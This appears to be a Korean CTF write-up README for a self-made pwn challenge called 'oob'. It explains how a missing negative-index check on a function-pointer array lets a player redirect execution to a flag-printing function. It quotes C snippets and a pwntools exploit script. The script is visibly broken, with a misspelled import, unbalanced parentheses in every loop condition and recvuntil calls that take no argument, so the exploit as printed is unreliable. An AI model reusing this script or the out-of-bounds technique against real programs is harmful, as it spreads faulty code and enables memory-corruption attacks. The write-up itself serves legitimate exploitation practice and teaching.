# 🐣oob🐣
![js](https://img.shields.io/badge/C-00599C?style=for-the-badge&logo=c&logoColor=white) ![js](https://img.shields.io/badge/Python-14354C?style=for-the-badge&logo=python&logoColor=white) ![js](https://img.shields.io/badge/Visual_Studio_Code-0078D4?style=for-the-badge&logo=visual%20studio%20code&logoColor=white)
## 개요
 - system out of bounds 취약점을 활용해 만든 문제입니다.
<br>

## 취약점
 - name변수를 전역변수로 지정해주며 초기화에 대한 검증을 진행하지 않았습니다.
 - 배열의 인덱스값을 사용자의 입력으로 받으며 인덱스의 음수검증을 진행하지않았습니다.

## 시나리오
 - 프로그램 실행도 분석
 - ultiate skill 함수에 접근해야 flag값을 획득하는것을 확인할수있다.
 
```
int ultimate_skill()
{
    printf("congrats!\n%s\n", getenv("flag"));
    exit(0);
}
```
 - code line 16 을 확인해보면 전역변수로 name이 선언되있는것을 확인할수있다.
```
char name[40] = "hIdd3n";
```
 - 다음 play함수에서 team1_hp==0 or team2_hp==0 일경우 게임이 종료되며 name의 값을 입력받을수있다.
```
return read(0,name,40);
```
 - skill 을 선택하는 index의 값을 사용자가 입력받는것을 볼수있고 그값은 사용자의 입력값 - 1
 - ex) skill_table[index-1] 이된다
```
 while(1)
    {
        printf("skill number : ");
        scanf("%d",&skill_select);
        getchar();
        if(skill_select<=3)
        {
            break;
        }
        printf("please select skill number 1~3\n");
    }
    skill_1 = skill_select - 1;
    printf("skill change!\n\n");
```
 - 그리고 그 인덱스값을 사용하는 배열을 확인해보면
```
void (*skillTable[3])() = {custom_skill_1,custom_skill_2,custom_skill_3,ultimate_skill};
```
 - 위 와 같이 전역변수로 포인터를 활용해 함수들의 집합이 배열인것을 확인할수있다.

## exploit
 - 위 시나리오대로 exploit 코드 작성
 - 배열은 index 1 당 8byte(배열은 주소를 참조하기때문)
 - 그럼 (skilltable_add - name_add)/8 + 1 이 인덱스의 값으로 들어가면 name에 접근가능
 - <img width="569" alt="image" src="https://github.com/ChCh0i/pwn/assets/108965611/8b9e3fbd-9db5-4f26-9306-7628422fef9f">

 - name의 값에는 ultimate_skill의 값을넣고 다음실행주소로 등록되게 지정
 - code
```
from pwn import *
inport time

context.arch = 'amd64'

p = process("./oob")
e = ELF("./oob")

ultimate_skill = e.symbols['ultimate_skill']
def func():
  p.recvuntil("Team1 : ")
  p.sendline("a")
  log.info("send TEAM1")

  p.recvuntil("Team2 : ")
  p.sendline("b")
  log.info("send TEAM2")

func()

while(1):
  p.recvuntil("select skill (y/n)? : ")
  p.sendline("n")
  sleep(1)

  data = p.recvuntil()
  if data == b"Team a win!\n" or data == b"Team b win!\n"):
    break

  data1 = p.recvuntil()
  if data1 == b"Team a win!\n" or data1 == b"Team b win!\n"):
    break

  data2 = p.recvuntil()
  if data2 == b"Team a win!\n" or data2 == b"Team b win!\n"):
    break

  data3 = p.recvuntil()
  if data3 == b"Team a win!\n" or data3 == b"Team b win!\n"):
    break

  data4 = p.recvuntil()
  if data4 == b"Team a win!\n" or data4 == b"Team b win!\n"):
    break

  data5 = p.recvuntil()
  if data5 == b"Team a win!\n" or data5 == b"Team b win!\n"):
    break

payload = p64(ultimate_skill)

p.sendline(payload)

func()

p.recvuntil("select skill (y/n)? : ")
p.sendline("y")

p.recvuntil("skill number : ")
p.sendline(str(-11))

p.interactive()
```

## 마무리
 - 해당 취약점을 보며 전역변수에대한 개념과 음수대입 등 여러 취약점을 알게된것같다.
 - 문제를 만들며 해당취약점으로 rop문제를 하나 만들어 내보면 재밌을것같으니 만들어서 올려보겠습니다.
